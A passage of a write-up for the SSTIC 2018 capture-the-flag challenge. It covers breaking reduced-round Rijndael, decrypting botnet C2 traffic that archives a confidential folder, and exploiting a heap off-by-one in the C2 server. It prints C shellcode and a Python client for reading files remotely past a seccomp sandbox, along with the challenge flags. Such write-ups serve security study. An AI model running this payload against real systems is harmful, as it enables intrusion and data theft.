      _packet_buffer[8] ^= prev_block[8];
      _packet_buffer[9] ^= prev_block[9];
      _packet_buffer[10] ^= prev_block[10];
      _packet_buffer[11] ^= prev_block[11];
      _packet_buffer[12] ^= prev_block[12];
      _packet_buffer[13] ^= prev_block[13];
      _packet_buffer[14] ^= prev_block[14];
      _packet_buffer[15] ^= prev_block[15];

      pt = (uint8_t *)_packet_buffer;
      _packet_buffer += 16;

      // AES encrypt
      rijndaelEncrypt((uint32_t *)a1->encoder, 4, pt, ct);
    }
    while ( plaintext_block != _packet_buffer );
    
    // send packet size, the payload
    if ( (exact_send(a1->socket_fd, (__int64)&packet_size, 4uLL, 0) & 0x8000000000000000LL) != 0LL )
      perror("send");
    v13 = exact_send(a1->socket_fd, (__int64)packet, packet_size, 0);
  
  // [...]
}
```

The encryption is not exactly `AES` but actually `Rijndael`, in which `AES` is based upon. `AES` is actually a standardization of `Rijndael`, which means `Rijndael` has more parametrization than `AES`. The vulnerability lies in the fact that `rijndaelEncrypt` is called with **4** rounds (`AES` force 10 rounds for 128-bit blocksize), which opens the encryptions scheme to key recovery via the Square attack :

![SSTIC2018_SquareAttack.PNG](/assets/SSTIC2018_SquareAttack.PNG)


This attack, which rely on bruteforcing parts of the encryption key, needs 256 similar ciphertexts with only a single variable bit. "Fortunately" for us, every encrypted messages starts with a message `IV` which is increasing one by one, allowing us to recover the keys. This attack has already been used in `0ctf` 2016, so I've repurposed a [team's tool](https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf) for this level, and recovered the keys :

- Decryption key : `[114, 255, 128, 54, 217, 32, 7, 119, 209, 233, 122, 91, 225, 211, 245, 20]`
- Encryption key : `[76, 26, 105, 54, 47, 224, 3, 54, 246, 168, 70, 15, 243, 61, 255, 213]`

Now we have the encryption keys, we can finally decipher the whole conversation. Here is the different commands used :

- [server] `EXEC` : `ls -la /home/`
- [client]
  ```
  total 12
  drwxr-xr-x  3 root root 4096 Mar  2 11:40 .
  drwxr-xr-x 24 root root 4096 Mar  2 11:40 ..
  drwxr-xr-x 22 user user 4096 Mar 29 03:06 user
  ```
- [server] `EXEC` : `ls -la /home/user`
  ```
  total 136
  drwxr-xr-x 22 user user 4096 Mar 29 03:06 .
  drwxr-xr-x  3 root root 4096 Mar  2 11:40 ..
  -rw-------  1 user user 1605 Mar 12 17:07 .bash_history
  -rw-r--r--  1 user user  220 Mar  2 11:40 .bash_logout
  -rw-r--r--  1 user user 3771 Mar  2 11:40 .bashrc
  drwx------ 14 user user 4096 Mar  4 05:50 .cache
  drwxrwxr-x 11 user user 4096 Mar 29 07:50 confidentiel
  drwx------ 18 user user 4096 Mar 29 07:18 .config
  drwxrwxr-x  2 user user 4096 Mar  4 14:53 davfi_v0.0.1_preview
  drwx------  3 root root 4096 Mar  4 15:01 .dbus
  drwxr-xr-x  4 user user 4096 Mar 29 07:18 Desktop
  -rw-r--r--  1 user user   25 Mar  2 11:42 .dmrc
  drwxr-xr-x  3 user user 4096 Mar  4 14:51 Documents
  drwxr-xr-x  2 user user 4096 Mar 12 10:56 Downloads
  -rw-r--r--  1 user user 8980 Mar  2 11:40 examples.desktop
  drwx------  2 user user 4096 Mar  4 05:54 .gconf
  drwx------  3 user user 4096 Mar  4 05:53 .gnupg
  -rw-------  1 user user  954 Mar  4 05:53 .ICEauthority
  drwxrwxr-x  2 user user 4096 Mar  4 14:52 inadequation_group_tools_leaked
  drwx------  3 user user 4096 Mar  2 11:42 .local
  drwx------  5 user user 4096 Mar  2 11:42 .mozilla
  drwxr-xr-x  2 user user 4096 Mar  2 11:42 Music
  drwxrwxr-x  2 user user 4096 Mar 28 09:37 .nano
  drwxrwxr-x  2 user user 4096 Mar  4 14:52 perso
  drwxr-xr-x  2 user user 4096 Mar  2 11:42 Pictures
  -rw-r--r--  1 user user  655 Mar  2 11:40 .profile
  drwxr-xr-x  2 user user 4096 Mar  2 11:42 Public
  -rw-r--r--  1 user user    0 Mar  3 00:47 .sudo_as_admin_successful
  drwxr-xr-x  2 user user 4096 Mar  2 11:42 Templates
  drwxr-xr-x  2 user user 4096 Mar  2 11:42 Videos
  -rw-------  1 user user   51 Mar  4 05:53 .Xauthority
  -rw-------  1 user user   82 Mar  4 05:53 .xsession-errors
  -rw-------  1 user user   82 Mar  4 05:50 .xsession-errors.old
  ```
- [server] `EXEC` : `ls -la /home/user/confidentiel`
  ```
  total 48
  drwxrwxr-x 11 user user 4096 Mar 29 07:50 .
  drwxr-xr-x 22 user user 4096 Mar 29 03:06 ..
  drwx------  2 user user 4096 Mar  5 09:53 Angel Fire
  drwx------  2 user user 4096 Mar  5 09:53 Athena
  drwx------  2 user user 4096 Mar  5 09:53 Bothan Spy
  drwx------  2 user user 4096 Mar  5 09:53 Couch Potato
  drwx------  2 user user 4096 Mar  5 09:53 High Rise
  drwx------  2 user user 4096 Mar  5 09:53 Hive
  drwx------  2 user user 4096 Mar  5 09:53 Imperial
  drwx------  2 user user 4096 Mar  5 09:53 Protego
  -rw-rw-r--  1 user user   44 Mar 28 09:38 super_secret
  drwx------  2 user user 4096 Mar  5 09:53 Weeping Angel
  ```
- [server] `EXEC` : `tar cvfz /tmp/confidentiel.tgz /home/user/confidentiel`
- [server] `READ` : `tmp/confidentiel.tgz`
- [client] "upload" `tmp/confidentiel.tgz`
- [server] `WRITE` : `tmp/surprise.tgz`
- [client] "download" `tmp/surprise.tgz`

There are some easter eggs (`inadequation_group_tools_leaked`, `davfi_v0.0.1_preview`, `sudo_as_admin_successful`, every Vault7 tool in `/home/confidentiel`) in the command logs. In the reconstructed `confidentiel.tgz` archive, there is a `super_secret` file with the flag for this level :

```
$\home\user\confidentiel> cat .\super_secret
SSTIC2018{07aa9feed84a9be785c6edb95688c45a}
```

The downloaded `surprise.tgz` is an archive with a lot of pictures of dogs dressed as lobsters. Make of that what you will.


![SSTIC2018_LobsterDog](/assets/SSTIC2018_LobsterDog.jpg)


### Botnet

For the final stage, we need to get an email from the attacker server in order to validate the challenge. First thing first, we need to locate the attacker's server.

The decrypted conversation between the infected machine and the C2 local server starts with an exchange of 2 packets : the client send a peering command and the C2 server answer with this :

![SSTIC2018_Peering](/assets/SSTIC2018_Peering.PNG)

The C2 server is in reality a gateway to relay commands from the attacker's server. Fortunately, the peering response contain a `sockaddr` structure describing the attacker's IP : `02 00 8F 7F C3 9A 69 0C` which gives `195.154.105.12` on port `36735`. This IP is actually public one, pointing to VPS server in Paris.

Now that we've located the attacker we need to find how to somewhat extract the email located on it. The attack surface is pretty reduced, every node on the mesh network only answer to 6 commands :

- `mesh_process_agent_peering` to declare a new gateway connecting directly to the server, or a new client connecting via the gateway.
- `mesh_process_dupl_addr` to handle duplicate peer nodes on the same mesh
- `msg_process_transmission` to process `put` commands
- `msg_process_transmission_done` to close `put` commands file descriptors.
- `msg_process_job` to launch a new job on the remote node
- `msg_process_ping` to ping a remote node on the mesh network.

The "attack" server has the special node id `0x00000000` which restrict even more the commands which are within reach from a client node :

- `mesh_process_agent_peering`
- `msg_process_ping`

The binary has several dead ends (like the previous stage for crypto attacks) : there are several buffer allocated on the stack (and never memset'ed) which are begging to be smashed; dangerous `strncpy` calls (but we don't control the `src` parameter); weird signed arithmetics on the packet size which magically turns out OK. The real vulnerability is a little less obvious : every node can also act as a gateway for underneath agents, and `mesh_process_agent_peering` register the underlying client at the gateway's parent level. The list of clients connected to a gateway is implemented as an ever-expanding dynamic array (which is reallocated when filled up), and there is an off-by-one when checking if the array is full :


```C
//
// @param route: route context representing a gateway and the attack server
// @param src_node_id : new node id from a client connected to the gateway
__int64[] __fastcall add_to_route(AGENT_ROUTE *route, uint64_t src_node_id)
{
  uint64_t _src_node_id; // rbp
  int _client_nodes_count; // edx
  uint64_t *_client_nodes; // rax

  _src_node_id = src_node_id;
  _client_nodes_count = route->__clients_count;
  _max_client_count = route->max_client_count;
  _client_nodes = route->_client_nodes;

  // BUG : The following comparison should be ">="
  if ( route->__clients_count > _max_client_count )
  {
    _new_max_client_count = _max_client_count + 5;
    route->max_client_count = _new_max_client_count;

    _client_nodes = (uint64_t *)realloc(_client_nodes, 8 * _new_max_client_count);
    
    _client_nodes_count = route->__clients_count;
    route->_client_nodes = _client_nodes;
  }

  // we can write route->_client_nodes[route->max_client_count] (64bit OOB write);
  _client_nodes[_client_nodes_count] = _src_node_id;
  route->__clients_count = _client_nodes_count + 1;

  return _client_nodes;
}
```

We have a 8-byte Out-of-Band write, and apparently only that. 

We have two heap structures we can use to "massage" the heap into an advantageous layout for us : every client context connected to the server is represented by a `0x230` mallocated chunk and the route's client node is a initial `0x41` chunk that can be reallocated at will (this is the one with the off-by-one overflow). The technique used here it quite similar to this one : https://github.com/shellphish/how2heap/blob/master/overlapping_chunks_2.c. The general gist here is to enlarge a freed chunk in order to create overlapping chunks and hopefully create a more powerful primitive. 

Since words usually fail at explaining exploitation steps, here's a drawing :

![Heap layout](/assets/SSTIC2018_HeapLayout.BMP)


The initial step consists of aligning the following heap block linearly :

- `attack` : the heap chunk where we can trigger the out of band write
- `target` : target chunk whose size will be enlarged
- `gap` : mandatory chunk since we only control parts of the `0x230` structure.
- `client` : a `0x230` chunk that will be freed in order to populate the free chunk list
- `guard` : a chunk that "box" the client chunk in and prevent "top" chunk from messing with our heap layout

Whenever a boxed chunk is freed, it is added to the free chunk list and the pointer to next free block `bk` is written inside the freed block. The aim of this heap massaging is to overwrite a `bk` pointer in order to control the address of the next mallocated chunk, and therefore obtain a write-what-where primitive. While the scenario is pretty elaborate in theory, it's in reality fucking painful since we only have partial control of the `0x230` data structure and there are a lot unwanted side effects (e.g. the newly allocated struct in step 6 overwrite parts of the overlapping struct in step 5, particularly it's socket `fd` ...). 

If every steps goes correctly, we can allocate a `0x241` chunk at a controllable address. Then the rest of pretty straightforward : I've used the controlled address allocation to overwrite `glibc's __realloc_hook` function and trigger it by spamming `mesh_process_agent_peering` from the client. The exploitation is a bit simplified since `glibc` lib is linked statically and `ASLR` is deactivated (no leak needed), however `DEP` is still active so we need to do some `ROP` before launching a shellcode.

... and of course there is a last hurdle. The binary, when launch as the attack server, is sandboxed using a `SECCOMP` filter, which means no `execve` possible. Here are the allowed syscalls :


| id | syscall |
|:----------:|:-------------:|
| 0x00 | read |
| 0x01 | write |
| 0x02 | open |
| 0x03 | write |
| 0x05 | fstat |
| 0x09 | mmap |
| 0x0b | munmap |
| 0x0c | brk |
| 0x101 | openat |
| 0x120 | setsockopt |
| 0x14 | writev |
| 0x17 | select |
| 0x19 | mremap |
| 0x20 | dup |
| 0x29 | socket |
| 0x2d | recvfrom |
| 0x31 | bind |
| 0x32 | listen |
| 0x36 | accept4 |
| 0x4e | getdents |
| 0xd9 | getdents64 |
| 0xe7 | exit_group |
| 0xec | sendto |
{:  text-align: center;"}

Apart from the usual network and memory syscalls, we have access to `read`, `write`, `getdents` and `fstat` which is more than necessary to do directory traversals and reading files on the remote machine. However `mprotect` is not on the list, therefore we need to do call `mmap` in order to allocate a `RWX` page for our shellcode (or do the whole thing in ropchains). Due to a lack of "practical" gadgets which limit my registers movements, I ended up setting up a bootstrap code to `memcpy` the whole shellcode before jumping on it :


![for rw to ace](/assets/SSTIC2018_ArbitraryCodeExecution.PNG)

Since we can't do a `connect` back (the `seccomp` filter blacklist it) from the shellcode, we have to reuse an opened socket. Fortunately, my ropchain do not clobber `r12` which still points to the `0x230` structure containing the socket `fd` for the last connected client.  

This is the C shellcode I've used and the server side in Python :


```C
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>   
#include <sys/socket.h>  
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>

typedef ssize_t (*recv_p)(int sockfd, void *buf, size_t len, int flags);
typedef ssize_t (*send_p)(int sockfd, const void *buf, size_t len, int flags);
typedef int (*open_p)(const char *pathname, int flags);
typedef ssize_t (*read_p)(int fd, void *buf, size_t count);
typedef int (*getdents_p)(unsigned int fd, struct linux_dirent *dirp,
                    unsigned int count);

int shellcode()
{

  int sock;
  char buffer[0x1000];
  uintptr_t p_reuse_sock;

  recv_p recv_fun = (recv_p) 0x4570F0;
  send_p send_fun = (send_p) 0x4571B0;
  open_p open_fun = (open_p) 0x454D10;
  read_p read_fun = (read_p) 0x454ED0;
  getdents_p getdents_fun = (getdents_p) 0x47FE20;

 
  // reuse socket
  asm volatile
  (
    "mov %%r12, %0\n\t"
    "addq $552, %0"
    : "=g"(p_reuse_sock) /* output */
    : /* no input */
    : /* clobbered register */
  );

  sock = ((int*) p_reuse_sock)[0];


  // send initial ping to attack client in order
  // to start communicating
  send_fun(sock , buffer , 0x300 , 0);
        
  //keep communicating with server
  while(1)
  {
    // memset the buffer
    for (int i =0; i < 0x300; i++) {
      buffer[i] = 0x00;
    }


    int n = recv_fun(sock , buffer , 0x300 , 0);
    if( n < 0)
    {
        break;
    }

    if (n > 0)
    {
      if (buffer[0] == 0)
      {
        int fd = open_fun(buffer + 1, O_RDONLY );
        read_fun (fd, &buffer, sizeof(buffer));

      }
      else if (buffer[0] == 1)
      {
        int fd = open_fun(buffer + 1, O_RDONLY | O_DIRECTORY);
        int nread = getdents_fun(fd, (struct linux_dirent *) buffer, 0x300);
      }
      else
      {
        // hard crash to force server reboot
        int (*null)() = 0x00;
        null();
      } 

      // Send back processed data
      if( send_fun(sock , buffer , 0x300 , 0) < 0)
      {
        break;
      }
    }
  }
     
    // don't bother closing the socket
    // close(sock);
    return 0;
}
```

```python

def parse_response(command, buffer):
  ''' crudely parse getdents response buffer '''

  # getdents types
  DIR_TYPE = 0x04
  FILE_TYPE = 0x08

  if command == 0x00:
      print(buffer)

  previous_char = 0x00
  for i in range(0, len(buffer)):
      
      current_char = buffer[i]

      if (current_char == DIR_TYPE or current_char == FILE_TYPE) and previous_char == 0x00:
          # trim name
          s = buffer[i+1:]
          end = s.find(b"\x00")
          s = s[0:end]
          
          #   
          print("%s : %s" % (("file", "dir")[current_char == DIR_TYPE], s))
  
  previous_char = current_char

# Custom server from reused socket
pingback =  fc9._socket.recv(0x300)
if len(pingback):
    print("ping received")
    print(pingback)

    while True:

        cmd = input("enter command:")
        path = input("enter path:")

        c = b"\x02"
        if cmd == "read":
            c = b"\x00"
        if cmd == "list":
            c = b"\x01"

        buf = c + path.encode('utf-8')
        fc9._socket.send(buf)
        
        response = fc9._socket.recv(0x300)
        if len(response):
            print (response)
```

Here how to get the flag :

```
>>> ls /home/
dir : b'.'
dir : b'..'
dir : b'sstic'
>>> ls /home/sstic/
dir : b'.'
dir : b'..'
dir : b'.ssh'
dir : b'secret'
file : b'.bashrc'
file : b'.lesshst'
file : b'.profile'
file : b'.viminfo'
file : b'agent.sh'
file : b'agent'
file : b'.bash_logout'
>>> ls /home/sstic/secret
dir : b'.'
dir : b'..'
file : b'sstic2018.flag'
>>> cat /home/sstic/secret/sstic2018.flag
65r1o0q1380ornqq763p96r74n0r51o816onpp68100s5p4s74955rqqr0p5507o@punyyratr.ffgvp.bet
```

The final flag is a simple ROT13 encoded value of `65e1b0d1380beadd763c96e74a0e51b816bacc68100f5c4f74955edde0c5507b@challenge.sstic.org` which is the email to find in order to validate the whole challenge.


### Conclusion

This is a pretty meaty challenge : while the fastest people completed in 5 days, it took several weeks for less able participants (myself included). I like that the scenario was kinda plausible and the differents levels leading naturally to the next one. I wished there was not so many crypto to break before the exploitation step, which was the most entertaining level by far.


### Script

<script src="https://gist.github.com/lucasg/ee9a7b9494543429a1389f7900c7e3ef.js"></script>
